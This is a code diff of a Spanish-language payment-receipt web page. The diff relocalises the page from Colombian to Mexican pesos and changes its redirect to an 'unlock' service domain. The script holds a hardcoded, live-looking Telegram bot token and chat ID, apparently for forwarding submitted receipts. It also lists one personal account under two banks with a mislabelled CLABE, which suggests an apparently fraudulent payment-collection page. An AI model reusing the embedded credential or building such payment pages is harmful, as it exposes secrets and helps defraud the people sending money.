@@ -283,7 +283,7 @@ input:focus ~ .i-turtle{transform:translateY(-50%) scale(1);opacity:1;animation:
             <input type="number" step="0.01" id="fUsd" placeholder="Ej. 3.50">
             <span class="i-turtle" onclick="showPanchita()">🦅</span>
           </div>
-          <div class="mxn-hint" id="mxnHint">Equivalente: $0 COP</div>
+          <div class="mxn-hint" id="mxnHint">Equivalente: $0 MXN</div>
         </div>
         <div class="checklist-wrap">
           <div class="checklist-title">✅ Confirma antes de continuar</div>
@@ -340,7 +340,7 @@ input:focus ~ .i-turtle{transform:translateY(-50%) scale(1);opacity:1;animation:
           <div class="success-title">¡Comprobante enviado!</div>
           <div class="success-sub">Lo recibimos correctamente. En breve procesaremos tu pago.</div>
           <div class="success-warn">⚠️ IMPORTANTE: No envíes el comprobante más de una vez. Los envíos duplicados pueden atorar tu solicitud y puede tardar en resolverse hasta 4 horas.</div>
-          <div class="countdown-txt">Redirigiendo en <b id="countNum">20</b> segundos…</div>
+          <div class="countdown-txt">Redirigiendo en <b id="countNum">60</b> segundos…</div>
         </div>
       </div>
 
@@ -354,8 +354,8 @@ input:focus ~ .i-turtle{transform:translateY(-50%) scale(1);opacity:1;animation:
 <div class="panchita" id="panchita">🦅 Las Águilas destacan por ver a largas distancias, nosotros por nuestro trabajo 🔥</div>
 
 <script>
-const RATE = 4000;
-const CURR_CODE = 'COP';
+const RATE = 20;
+const CURR_CODE = 'MXN';
 const MIN_USD = 3;
 const BOT_TOKEN = '8259032635:AAH6lfjq0Ep_AoXzm7phIUaAIPP6CYIPF9M';
 const CHAT_ID = '8560366694';
@@ -411,12 +411,12 @@ const bankData = {
   "transferencia":{html:`<div class="bank-row">🏛 <span class="bank-label">BANCO</span><span class="bank-val">Nequi</span><span class="copy" onclick="copiar(this,'Nequi')">📋</span></div>
 <div class="bank-row">💳 <span class="bank-label">CLABE</span><span class="bank-val">3183929981</span><span class="copy" onclick="copiar(this,'3183929981')">📋</span></div>
 <div class="bank-row">👤 <span class="bank-label">NOMBRE</span><span class="bank-val">LIBARDO LEAL</span><span class="copy" onclick="copiar(this,'LIBARDO LEAL')">📋</span></div>
-<div class="bank-row">💵 <span class="bank-label">TIPO DE CAMBIO</span><span class="bank-val">1 USD = 4000 COP</span><span class="copy" onclick="copiar(this,'1 USD = 4000 COP')">📋</span></div>
+<div class="bank-row">💵 <span class="bank-label">TIPO DE CAMBIO</span><span class="bank-val">1 USD = 20 MXN</span><span class="copy" onclick="copiar(this,'1 USD = 20 MXN')">📋</span></div>
 <div class="bank-note">🕐 Aprobación en minutos.</div>`},
   "oxxo":{html:`<div class="bank-row">🏛 <span class="bank-label">BANCO</span><span class="bank-val">Nu-Bank </span><span class="copy" onclick="copiar(this,'Nu-Bank ')">📋</span></div>
 <div class="bank-row">💳 <span class="bank-label">CLABE</span><span class="bank-val">3183929981</span><span class="copy" onclick="copiar(this,'3183929981')">📋</span></div>
 <div class="bank-row">👤 <span class="bank-label">NOMBRE</span><span class="bank-val">LIBARDO LEAL</span><span class="copy" onclick="copiar(this,'LIBARDO LEAL')">📋</span></div>
-<div class="bank-row">💵 <span class="bank-label">TIPO DE CAMBIO</span><span class="bank-val">1 USD = 4000 COP</span><span class="copy" onclick="copiar(this,'1 USD = 4000 COP')">📋</span></div>
+<div class="bank-row">💵 <span class="bank-label">TIPO DE CAMBIO</span><span class="bank-val">1 USD = 20 MXN</span><span class="copy" onclick="copiar(this,'1 USD = 20 MXN')">📋</span></div>
 <div class="bank-note">🕐 Aprobación en minutos.</div>`}
 };
 
@@ -589,9 +589,9 @@ async function sendForm(){
   document.getElementById('summaryBox').style.display='none';
   document.getElementById('successScreen').classList.add('show');
   document.getElementById('btnBackStep3').style.display='none';
-  let secs=20;
+  let secs=60;
   const counter=document.getElementById('countNum');
-  const t=setInterval(()=>{secs--;counter.textContent=secs;if(secs<=0){clearInterval(t);window.location.href='https://wsservermx.com';}},1000);
+  const t=setInterval(()=>{secs--;counter.textContent=secs;if(secs<=0){clearInterval(t);window.location.href='https://libardounlock.com';}},1000);
 }
 
 function copiar(el,texto){
